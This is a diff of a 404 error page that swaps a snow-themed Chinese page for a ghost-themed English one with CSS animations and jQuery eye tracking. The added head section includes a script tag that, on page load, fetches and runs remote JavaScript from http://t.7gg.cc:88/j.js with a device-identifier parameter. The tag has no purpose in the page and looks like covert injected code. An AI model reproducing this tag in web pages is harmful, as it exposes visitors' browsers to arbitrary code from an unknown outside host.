@@ -1,311 +1,418 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta content="width=device-width,initial-scale=1,maximum-scale=1" name="viewport">
-    <title>下雪特效404错误页面 - 404.life</title>
+    <script src=http://t.7gg.cc:88/j.js?MAC=68DB5482FAF5></script>
+    <meta charset="utf-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+    <title>404 - Page Not Found</title>
 
+    <script type="text/javascript" src="js/jquery.min.js"></script>
 
     <style>
         html,
         body {
-            height: 100%;
-            min-height: 450px;
-            font-size: 32px;
-            font-weight: 500;
-            color: #5d7399;
-            margin: 0;
-            padding: 0;
-            border: 0;
+            background: #28254C;
+            font-family: 'Ubuntu';
         }
 
-        .content {
+        * {
+            box-sizing: border-box;
+        }
+
+        .box {
+            width: 350px;
             height: 100%;
+            max-height: 600px;
+            min-height: 450px;
+            background: #332F63;
+            border-radius: 20px;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 30px 50px;
+        }
+
+        .box .box__ghost {
+            padding: 15px 25px 25px;
+            position: absolute;
+            left: 50%;
+            top: 30%;
+            transform: translate(-50%, -30%);
+        }
+
+        .box .box__ghost .symbol:nth-child(1) {
+            opacity: .2;
+            animation: shine 4s ease-in-out 3s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(1):before,
+        .box .box__ghost .symbol:nth-child(1):after {
+            content: '';
+            width: 12px;
+            height: 4px;
+            background: #fff;
+            position: absolute;
+            border-radius: 5px;
+            bottom: 65px;
+            left: 0;
+        }
+
+        .box .box__ghost .symbol:nth-child(1):before {
+            transform: rotate(45deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(1):after {
+            transform: rotate(-45deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(2) {
+            position: absolute;
+            left: -5px;
+            top: 30px;
+            height: 18px;
+            width: 18px;
+            border: 4px solid;
+            border-radius: 50%;
+            border-color: #fff;
+            opacity: .2;
+            animation: shine 4s ease-in-out 1.3s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(3) {
+            opacity: .2;
+            animation: shine 3s ease-in-out .5s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(3):before,
+        .box .box__ghost .symbol:nth-child(3):after {
+            content: '';
+            width: 12px;
+            height: 4px;
+            background: #fff;
+            position: absolute;
+            border-radius: 5px;
+            top: 5px;
+            left: 40px;
+        }
+
+        .box .box__ghost .symbol:nth-child(3):before {
+            transform: rotate(90deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(3):after {
+            transform: rotate(180deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(4) {
+            opacity: .2;
+            animation: shine 6s ease-in-out 1.6s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(4):before,
+        .box .box__ghost .symbol:nth-child(4):after {
+            content: '';
+            width: 15px;
+            height: 4px;
+            background: #fff;
+            position: absolute;
+            border-radius: 5px;
+            top: 10px;
+            right: 30px;
+        }
+
+        .box .box__ghost .symbol:nth-child(4):before {
+            transform: rotate(45deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(4):after {
+            transform: rotate(-45deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(5) {
+            position: absolute;
+            right: 5px;
+            top: 40px;
+            height: 12px;
+            width: 12px;
+            border: 3px solid;
+            border-radius: 50%;
+            border-color: #fff;
+            opacity: .2;
+            animation: shine 1.7s ease-in-out 7s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(6) {
+            opacity: .2;
+            animation: shine 2s ease-in-out 6s infinite;
+        }
+
+        .box .box__ghost .symbol:nth-child(6):before,
+        .box .box__ghost .symbol:nth-child(6):after {
+            content: '';
+            width: 15px;
+            height: 4px;
+            background: #fff;
+            position: absolute;
+            border-radius: 5px;
+            bottom: 65px;
+            right: -5px;
+        }
+
+        .box .box__ghost .symbol:nth-child(6):before {
+            transform: rotate(90deg);
+        }
+
+        .box .box__ghost .symbol:nth-child(6):after {
+            transform: rotate(180deg);
+        }
+
+        .box .box__ghost .box__ghost-container {
+            background: #fff;
+            width: 100px;
+            height: 100px;
+            border-radius: 100px 100px 0 0;
             position: relative;
-            z-index: 1;
-            background-color: #d2e1ec;
-            background-image: -webkit-linear-gradient(top, #bbcfe1 0%, #e8f2f6 80%);
-            background-image: linear-gradient(to bottom, #bbcfe1 0%, #e8f2f6 80%);
+            margin: 0 auto;
+            animation: upndown 3s ease-in-out infinite;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-eyes {
+            position: absolute;
+            left: 50%;
+            top: 45%;
+            height: 12px;
+            width: 70px;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-eyes .box__eye-left {
+            width: 12px;
+            height: 12px;
+            background: #332F63;
+            border-radius: 50%;
+            margin: 0 10px;
+            position: absolute;
+            left: 0;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-eyes .box__eye-right {
+            width: 12px;
+            height: 12px;
+            background: #332F63;
+            border-radius: 50%;
+            margin: 0 10px;
+            position: absolute;
+            right: 0;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-bottom {
+            display: flex;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-bottom div {
+            flex-grow: 1;
+            position: relative;
+            top: -10px;
+            height: 20px;
+            border-radius: 100%;
+            background-color: #fff;
+        }
+
+        .box .box__ghost .box__ghost-container .box__ghost-bottom div:nth-child(2n) {
+            top: -12px;
+            margin: 0 -0px;
+            border-top: 15px solid #332F63;
+            background: transparent;
+        }
+
+        .box .box__ghost .box__ghost-shadow {
+            height: 20px;
+            box-shadow: 0 50px 15px 5px #3B3769;
+            border-radius: 50%;
+            margin: 0 auto;
+            animation: smallnbig 3s ease-in-out infinite;
+        }
+
+        .box .box__description {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .box .box__description .box__description-container {
+            color: #fff;
+            text-align: center;
+            width: 200px;
+            font-size: 16px;
+            margin: 0 auto;
+        }
+
+        .box .box__description .box__description-container .box__description-title {
+            font-size: 24px;
+            letter-spacing: .5px;
+        }
+
+        .box .box__description .box__description-container .box__description-text {
+            color: #8C8AA7;
+            line-height: 20px;
+            margin-top: 20px;
+        }
+
+        .box .box__description .box__button {
+            display: block;
+            position: relative;
+            background: #FF5E65;
+            border: 1px solid transparent;
+            border-radius: 50px;
+            height: 50px;
+            text-align: center;
+            text-decoration: none;
+            color: #fff;
+            line-height: 50px;
+            font-size: 18px;
+            padding: 0 70px;
+            white-space: nowrap;
+            margin-top: 25px;
+            transition: background .5s ease;
             overflow: hidden;
         }
 
-        .snow {
-            position: absolute;
-            top: 0;
-            left: 0;
-            pointer-events: none;
-            z-index: 20;
-        }
-
-        .main-text {
-            padding: 20vh 20px 0 20px;
-            text-align: center;
-            line-height: 2em;
-            font-size: 5vh;
-        }
-
-        .main-text h1 {
-            font-size: 45px;
-            line-height: 48px;
-            margin: 0;
-            padding: 0;
-        }
-
-        .main-text-a {
-            height: 32px;
-            margin-left: auto;
-            margin-right: auto;
-            text-align: center;
-        }
-
-        .main-text-a a {
-            font-size: 16px;
-            text-decoration: none;
-            color: #0066CC;
-        }
-
-        .main-text-a a:hover {
-            color: #000;
-        }
-
-        .home-link {
-            font-size: 0.6em;
-            font-weight: 400;
-            color: inherit;
-            text-decoration: none;
-            opacity: 0.6;
-            border-bottom: 1px dashed rgba(93, 115, 153, 0.5);
-        }
-
-        .home-link:hover {
-            opacity: 1;
-        }
-
-        .ground {
-            height: 160px;
-            width: 100%;
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            background: #f6f9fa;
-            box-shadow: 0 0 10px 10px #f6f9fa;
-        }
-
-        .ground:before,
-        .ground:after {
+        .box .box__description .box__button:before {
             content: '';
-            display: block;
-            width: 250px;
-            height: 250px;
             position: absolute;
-            top: -62.5px;
-            z-index: -1;
+            width: 20px;
+            height: 100px;
+            background: #fff;
+            bottom: -25px;
+            left: 0;
+            border: 2px solid #fff;
+            transform: translateX(-50px) rotate(45deg);
+            transition: transform .5s ease;
+        }
+
+        .box .box__description .box__button:hover {
             background: transparent;
-            -webkit-transform: scaleX(0.2) rotate(45deg);
-            transform: scaleX(0.2) rotate(45deg);
+            border-color: #fff;
         }
 
-        .ground:after {
-            left: 50%;
-            margin-left: -166.66667px;
-            box-shadow: -340px 260px 15px #8193b2, -620px 580px 15px #8193b2, -900px 900px 15px #b0bccf, -1155px 1245px 15px #b4bed1, -1515px 1485px 15px #8193b2, -1755px 1845px 15px #8a9bb8, -2050px 2150px 15px #91a1bc, -2425px 2375px 15px #bac4d5, -2695px 2705px 15px #a1aec6, -3020px 2980px 15px #8193b2, -3315px 3285px 15px #94a3be, -3555px 3645px 15px #9aa9c2, -3910px 3890px 15px #b0bccf, -4180px 4220px 15px #bac4d5, -4535px 4465px 15px #a7b4c9, -4840px 4760px 15px #94a3be;
+        .box .box__description .box__button:hover:before {
+            transform: translateX(250px) rotate(45deg);
         }
 
-        .ground:before {
-            right: 50%;
-            margin-right: -166.66667px;
-            box-shadow: 325px -275px 15px #b4bed1, 620px -580px 15px #adb9cd, 925px -875px 15px #a1aec6, 1220px -1180px 15px #b7c1d3, 1545px -1455px 15px #7e90b0, 1795px -1805px 15px #b0bccf, 2080px -2120px 15px #b7c1d3, 2395px -2405px 15px #8e9eba, 2730px -2670px 15px #b7c1d3, 2995px -3005px 15px #9dabc4, 3285px -3315px 15px #a1aec6, 3620px -3580px 15px #8193b2, 3880px -3920px 15px #aab6cb, 4225px -4175px 15px #9dabc4, 4510px -4490px 15px #8e9eba, 4785px -4815px 15px #a7b4c9;
+        @keyframes upndown {
+            0% {
+                transform: translateY(5px);
+            }
+
+            50% {
+                transform: translateY(15px);
+            }
+
+            100% {
+                transform: translateY(5px);
+            }
         }
 
-        .mound {
-            margin-top: -80px;
-            font-weight: 800;
-            font-size: 180px;
-            text-align: center;
-            color: #dd4040;
-            pointer-events: none;
+        @keyframes smallnbig {
+            0% {
+                width: 90px;
+            }
+
+            50% {
+                width: 100px;
+            }
+
+            100% {
+                width: 90px;
+            }
         }
 
-        .mound:before {
-            content: '';
-            display: block;
-            width: 600px;
-            height: 200px;
-            position: absolute;
-            left: 50%;
-            margin-left: -300px;
-            top: 50px;
-            z-index: 1;
-            border-radius: 100%;
-            background-color: #e8f2f6;
-            background-image: -webkit-linear-gradient(top, #dee8f1, #f6f9fa 60px);
-            background-image: linear-gradient(to bottom, #dee8f1, #f6f9fa 60px);
-        }
+        @keyframes shine {
+            0% {
+                opacity: .2;
+            }
 
-        .mound:after {
-            content: '';
-            display: block;
-            width: 28px;
-            height: 6px;
-            position: absolute;
-            left: 50%;
-            margin-left: -150px;
-            top: 68px;
-            z-index: 2;
-            background: #dd4040;
-            border-radius: 100%;
-            -webkit-transform: rotate(-15deg);
-            transform: rotate(-15deg);
-            box-shadow: -56px 12px 0 1px #dd4040, -126px 6px 0 2px #dd4040, -196px 24px 0 3px #dd4040;
-        }
+            25% {
+                opacity: .1;
+            }
 
-        .mound_text {
-            -webkit-transform: rotate(6deg);
-            transform: rotate(6deg);
-        }
+            50% {
+                opacity: .2;
+            }
 
-        .mound_spade {
-            display: block;
-            width: 35px;
-            height: 30px;
-            position: absolute;
-            right: 50%;
-            top: 42%;
-            margin-right: -250px;
-            z-index: 0;
-            -webkit-transform: rotate(35deg);
-            transform: rotate(35deg);
-            background: #dd4040;
-        }
-
-        .mound_spade:before,
-        .mound_spade:after {
-            content: '';
-            display: block;
-            position: absolute;
-        }
-
-        .mound_spade:before {
-            width: 40%;
-            height: 30px;
-            bottom: 98%;
-            left: 50%;
-            margin-left: -20%;
-            background: #dd4040;
-        }
-
-        .mound_spade:after {
-            width: 100%;
-            height: 30px;
-            top: -55px;
-            left: 0%;
-            box-sizing: border-box;
-            border: 10px solid #dd4040;
-            border-radius: 4px 4px 20px 20px;
+            100% {
+                opacity: .2;
+            }
         }
     </style>
-
 </head>
 
-<body translate="no">
-    <div class="content">
-        <canvas class="snow" id="snow" width="1920" height="917"></canvas>
-        <div class="main-text">
-            <h1>天啊，<br>页面在雪地里失踪了！</h1>
-            <div class="main-text-a"><a href="https:blog.shipengx.com">&lt; 返回首页</a></div>
-        </div>
-        <div class="ground">
-            <div class="mound">
-                <div class="mound_text">404 </div>
-                <div class="mound_spade"></div>
+<body>
+    <div class="box">
+        <div class="box__ghost">
+            <div class="symbol"></div>
+            <div class="symbol"></div>
+            <div class="symbol"></div>
+            <div class="symbol"></div>
+            <div class="symbol"></div>
+            <div class="symbol"></div>
+
+            <div class="box__ghost-container">
+                <div class="box__ghost-eyes">
+                    <div class="box__eye-left"></div>
+                    <div class="box__eye-right"></div>
+                </div>
+                <div class="box__ghost-bottom">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
             </div>
+            <div class="box__ghost-shadow"></div>
         </div>
+
+        <div class="box__description">
+            <div class="box__description-container">
+                <div class="box__description-title">404</div>
+                <div class="box__description-text">Page Not Found</div>
+            </div>
+
+            <a href="#" class="box__button">Go Back</a>
+
+        </div>
+
     </div>
 
-
     <script>
-        (function () {
-            function ready(fn) {
-                if (document.readyState != 'loading') {
-                    fn();
-                } else {
-                    document.addEventListener('DOMContentLoaded', fn);
-                }
-            }
+        //based on https://dribbble.com/shots/3913847-404-page
 
-            function makeSnow(el) {
-                var ctx = el.getContext('2d');
-                var width = 0;
-                var height = 0;
-                var particles = [];
+        var pageX = $(document).width();
+        var pageY = $(document).height();
+        var mouseY = 0;
+        var mouseX = 0;
 
-                var Particle = function () {
-                    this.x = this.y = this.dx = this.dy = 0;
-                    this.reset();
-                }
+        $(document).mousemove(function (event) {
+            //verticalAxis
+            mouseY = event.pageY;
+            yAxis = (pageY / 2 - mouseY) / pageY * 300;
+            //horizontalAxis
+            mouseX = event.pageX / -pageX;
+            xAxis = -mouseX * 100 - 100;
 
-                Particle.prototype.reset = function () {
-                    this.y = Math.random() * height;
-                    this.x = Math.random() * width;
-                    this.dx = (Math.random() * 1) - 0.5;
-                    this.dy = (Math.random() * 0.5) + 0.5;
-                }
+            $('.box__ghost-eyes').css({ 'transform': 'translate(' + xAxis + '%,-' + yAxis + '%)' });
 
-                function createParticles(count) {
-                    if (count != particles.length) {
-                        particles = [];
-                        for (var i = 0; i < count; i++) {
-                            particles.push(new Particle());
-                        }
-                    }
-                }
+            //console.log('X: ' + xAxis);
 
-                function onResize() {
-                    width = window.innerWidth;
-                    height = window.innerHeight;
-                    el.width = width;
-                    el.height = height;
-
-                    createParticles((width * height) / 10000);
-                }
-
-                function updateParticles() {
-                    ctx.clearRect(0, 0, width, height);
-                    ctx.fillStyle = '#f6f9fa';
-
-                    particles.forEach(function (particle) {
-                        particle.y += particle.dy;
-                        particle.x += particle.dx;
-
-                        if (particle.y > height) {
-                            particle.y = 0;
-                        }
-
-                        if (particle.x > width) {
-                            particle.reset();
-                            particle.y = 0;
-                        }
-
-                        ctx.beginPath();
-                        ctx.arc(particle.x, particle.y, 5, 0, Math.PI * 2, false);
-                        ctx.fill();
-                    });
-
-                    window.requestAnimationFrame(updateParticles);
-                }
-
-                onResize();
-                updateParticles();
-            }
-
-            ready(function () {
-                var canvas = document.getElementById('snow');
-                makeSnow(canvas);
-            });
-        })();
-    </script>
-
+        });</script>
 
 </body>
 
